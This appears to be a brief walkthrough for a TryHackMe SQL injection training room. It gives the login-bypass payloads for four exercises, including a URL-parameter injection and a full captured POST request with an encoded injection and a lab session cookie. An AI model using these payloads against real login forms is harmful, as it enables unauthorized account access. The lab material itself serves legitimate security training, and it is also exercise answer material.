# SQL Injection Lab

**Room Link:** [https://tryhackme.com/room/sqlilab](https://tryhackme.com/room/sqlilab)



## Introduction to SQL Injection: Part 1

### SQL Injection 1: Input Box Non-String

```
1 or 1=1-- -
```

### **SQL Injection 2: Input Box String**

```
1' or '1'='1'-- -
```

### SQL Injection 3: URL Injection

```
$VICTIM:5000/sesqli3/login?profileID=1' or 1=1-- -&password=a
```

**SQL Injection 4: POST Injection**

```
POST /sesqli4/login HTTP/1.1
Host: 10.10.164.155:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://10.10.164.155:5000
Connection: close
Referer: http://10.10.164.155:5000/sesqli4/login
Cookie: session=.eJy90jFrYzEMB_Dv4jmDZUu2nPk46NLt5iLJMjyaNu17PUoJ-e7nXI-jQ4dM2SwJhH_--xQ2314PCzx0eZOwP4Vfdz_CHnbBn2Q5hH0Iu_AsTz5PP1d5tuOyXTqLPd5_dmf1Itv2clzf7tdZc4mUiCJgZPw3fD-ufY7QOI8aTUYWsCaGhrWnhuRxVB61Z5JqDVDYgaFkMU-ZBdS9gF62rcexHPxyxwBxNjY5yPoR9oniefcf83vz9WHpfyGfvXQLYC0aidFb0xoVW1UpyJkUnBw9RaCEVIs0kMo5C08rFNds2ebGa4HpG2C-BdBsoEGExuRZXWZydQpkFHVuOXJXm_Mxjbm7zgeY-WKx1HtDALsWmL8B4i2AvQnUwtgGWbFOM0TqQI3ZSKypKs_Pi105F-k8mDRy9QQ4BJpdnSB-AZ7_ABfzCOM.ZO_PVg.gxMIbBhBjlFSHtc1twhp3ImdLj4
Upgrade-Insecure-Requests: 1

profileID=-1%27%20or%201=1--%20-&password=a
```





